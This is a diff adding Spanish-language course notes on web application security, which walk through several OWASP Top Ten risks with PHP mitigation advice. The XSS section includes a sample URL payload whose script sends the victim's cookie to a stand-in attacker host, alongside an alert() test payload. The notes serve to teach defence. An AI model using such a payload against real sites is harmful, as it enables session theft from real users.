@@ -1,0 +1,148 @@
+Seguridad en aplicaciones WEB : Algunos Aspectos a Considerar
+
+Contexto
+- En sus inicios, la Web permitía compartir información en forma libre.
+- A medida que su uso se diversificó, agregando funcionalidad para acceder a información sensible, se hizo necesario contar con mecanismos que aseguren la privacidad y la integridad de la información.
+
+Una aplicación Web insegura atenta contra la reputación de la organización, la disponibilidad del
+servicio, la confidencialidad y la integridad de los datos.
+
+Aspectos de Seguridad en PHP
+- Algunas consideraciones exceden al desarrollador, ya que dependen de configuraciones de las redes o
+servidores.
+- Otras, si dependen de una buena programación.
+- Nosotros ya vimos algunas ...
+
+El Proyecto OWASP
+- Proyecto Abierto de Seguridad de Aplicaciones Web. Tiene por objeto ayudar a las organizaciones a desarrollar y mantener aplicaciones confiables.
+- Brinda herramientas para aprender y realizar testeos, como Wescarb y Webgoat, foros, videos de ejemplos y mucha documentación, como la OWASP Guide, code Review.
+
+Sólo vamos a ver algunas relacionadas con el desarrollo.
+
+A1 - Inyección: Ocurre cuando datos no confiables son enviados a un intérprete como parte de un comando o
+consulta.
+
+Este tipo de vulnerabilidad es muy común.
+El atacante envía simples cadenas de texto que explotan la sintaxis del intérprete atacado.
+Las fallas de inyección ocurren cuando una aplicación envía datos no confiables a un intérprete.
+Hay de distintos tipos, como SQL, LDAP, XPath, XSLT, entre otros.
+
+Una SQL Injection suele ocurrir cuando se arma en forma descuidada una consulta a la base de datos a partir de los datos ingresados por el usuario.
+Dentro de estos parámetros pueden venir el código malicioso.
+
+Injection - ¿Cómo evitarlo?
+Mantener los datos no confiables separados de comandos y consultas.
+APIs seguras que eviten el uso del intérprete completamente o provea una interfaz parametrizada.
+Escapar los caracteres especiales utilizando una sintaxis de escape especial para dicho intérprete.
+
+Armar un esquema de permisos adecuado. Por ejemplo a nivel de base de datos.
+Realizar consultas concretas, evitar el select * 
+Filtrar los errores, por ejemplo a través del manejo de excepciones. Una vez puesto en producción, desactivar la variable error_reports de php.ini
+Comprobar los parámetros de entrada en el servidor. Por ejemplo usando empty() para ver si el dato está, buscando “caracteres mágicos” como doble comilla, comilla simple entre otros y utilizar caracteres de escape.
+
+Veremos ejemplo de login con PDO Es importante buscar la forma específica para cada lenguaje, motor de base o mecanismo que se utilice para acceder a la base.
+Pero es DESEABLE que la aplicación se autoproteja → ¿Qué pasa si dependemos del php.ini cuando cambia de entorno nuestra aplicación?
+
+A2 - Pérdida de Autenticación y Gestión de Sesiones
+Si las funciones autenticación y gestión de sesiones son implementadas incorrectamente, es posible comprometer contraseñas, llaves, token de sesiones, o explotar otras fallas de implementación para asumir la identidad de otros usuarios.
+
+
+Pérdida de autenticación ...
+- El atacante utiliza fallas en las funciones de autenticación o gestión de las sesiones (por ejemplo cuentas expuestas, contraseñas, identificadores de sesión) para hacerse pasar por usuarios.
+- Se aprovechan de vulnerabilidades en las secciones de cierre de sesión, gestión de contraseñas, tiempo
+de desconexión, función de recordar contraseña, pregunta secreta, actualización de cuenta, etc.
+
+Aspectos a tener en cuenta...
+- Las credenciales deben estar protegidas. 
+- No debe ser posible sobreescribir o adivinar las credenciales: revisar funciones de cambio de contraseñas, recuperación de las mismas, etc. 
+- No mostrar id de sesión en la URL.
+- Verificar siempre que se cierre la sesión o el tiempo en que caducan.
+- No basarse solo en que la session exista... poner controles adicionales como ser token de sesión, ip
+origen, revalidación ante funciones críticas, etc
+
+A3 – Secuencia de Comandos en Sitios Cruzados (XSS)
+
+Ocurren cada vez que una aplicación toma datos no confiables y los envía al navegador web sin una validación y codificación apropiada.
+
+Este tipo de vulnerabilidad también es muy común.
+Se lo conoce como XSS para que no sea confundido con CSS.
+En general ocurren cuando una aplicación toma datos de un usuario, no los filtra en forma adecuada y los
+retorna sin validarlos ni codificarlos.
+Puede insertarse HTML, Javascript, entre otros, a través de los formularios o la URL.
+
+Con esta vulnerabilidad es posible robar el acceso de los usuarios y violar la integridad y confiabilidad de sus datos. Por ejemplo robando nombres de usuarios, claves, cookies. También es posible ejecutar código en forma remota inyectando código a través de la URL.
+Existen tres tipos conocidos de fallas XSS:
+- 1) Almacenados,
+- 2) Reflejados,
+- 3) XSS basado en DOM.
+
+Ejemplo:
+http://sitio_vulnerable.com/index.html#name=<script>alert(“Ataque!”);</script>
+
+El navegador ignora todo lo que va después de #, no lo manda al servidor. Ejecuta la petición y no se da
+cuenta de la inyección. Se ejecuta con los permisos que tiene el usuario en esa máquina.
+Para postear un comentario, el usuario registrado envía la URL: http://video_inseguro.com.ar/busqueda.php?clave=
+El atacante entonces convence a la víctima para que acceda a:
+
+http://video_inseguro.com.ar/busqueda.php?clave=<script>window.location=http://ataque.com.ar/xss.php?cookie='+document.cookie</script>
+
+y se queda con la cookie de la víctima.
+
+
+¿Cómo evitarlo?
+Validar la entrada: sintaxis, etc. longitud, tipo,
+Reemplazar las “ ”, las palabras script, etc.
+Usar herramientas de detección de XSS en nuestra aplicación.
+Usar motores de templates como por ejemplo Twig
+
+A4 – Referencia Directa Insegura a Objetos
+Ocurre cuando se expone una referencia a un objeto de implementación interno, tal como un archivo,
+directorio, o base de datos.
+
+Una referencia explícita a un archivo, directorio, base de datos o parámetro de un formulario, queda
+visible a terceros.
+El atacante puede usar esa información para acceder a objetos sin autorización.
+Los más comunes son acceder al file system del servidor o acceder a la definición de conexión de la
+base de datos.
+
+¿Cómo evitarlo?
+Evitar la exposición de referencias directas de objetos que sea fácil de validar o que incluya
+claves primarias o nombres de archivos.
+Validar el formato de las entradas.
+Verificar la autorización de todos los objetos referenciados.
+
+Supongamos un sitio donde los usuarios pueden escribir novedades. También tienen permisos para eliminarlas. La interfaz sería algo como:
+
+Si no se validan los permisos y no maneja bien la seguridad, cualquiera puede copiar esa URL y pegarla en un navegador eliminando así novedades sin autorización.
+
+A6 - Exposición de datos sensibles
+El error más común en este área es simplemente no cifrar datos que deberían ser cifrados.
+Los atacantes normalmente no pueden romper el sistema criptográfico.
+
+Los datos sensibles deben tener protección extra como ser encriptación, tanto cuando están almacenados
+o en tránsito cuando se intercambia con el browser del cliente.
+Muchas aplicaciones no protegen correctamente los datos sensibles, como ser tarjetas de crédito, datos económicos y datos de autenticación.
+
+Un atacante no necesita atacar directamente, simplemente accede por ejemplo mediante un SQL injection y tiene a disposición todos los datos.
+Esta vulnerabilidad normalmente compromete todos los datos que deberían haber estado cifrados. 
+Típicamente esta información incluye datos sensibles tales como datos médicos, cuentas de usuario, datos personales, tarjetas de crédito, etc.
+Si no hay cifrado en el transporte (típicamente https) cualquiera puede “escuchar” y “entender” la conversación entre cliente y servidor
+
+¿Cómo evitarlo?
+Siempre cifrar datos críticos → nadie sin los permisos adecuados debería leerlos
+En el caso de contraseñas NADIE debería leerlos → tienen que almacenarse como hash y en el momento de la comprobación comparar hash.
+Utilizar funciones estándar y de ser posible es deseable usar SALT
+
+A10 - Redirecciones y reenvíos no validados
+
+Ocurre cuando una aplicación redirige o reenvía a los usuarios hacia una página o sitio web sin validación adecuada. En este caso, los atacantes pueden redirigir a las víctimas  hacia otros sitios si que el usuario se percate de la situación.
+
+Un atacante crea enlaces a redirecciones no validadas y engaña a las víctimas para que hagan clic en dichos enlaces. Las víctimas son más propensas a hacer clic sobre ellos ya que el enlace lleva a una aplicación en la que se confía.
+Si la página de destino se especifica en un parámetro no validado, se permite a los atacantes elegir dicha página.
+
+VALIDAR SIEMPRE entradas de datos.
+Usar APIs conocidas y probadas.
+Estar atentos a situaciones que involucren uso de eval(), include(), requiere(), fopen(), system(), etc.
+Revisar aspectos de configuración básicos tanto en el intérprete, framework, web server o base de datos.
+Usar htmlentities(), urlencode(), etc.
+Usar $_GET, $_POST, etc. según corresponda.
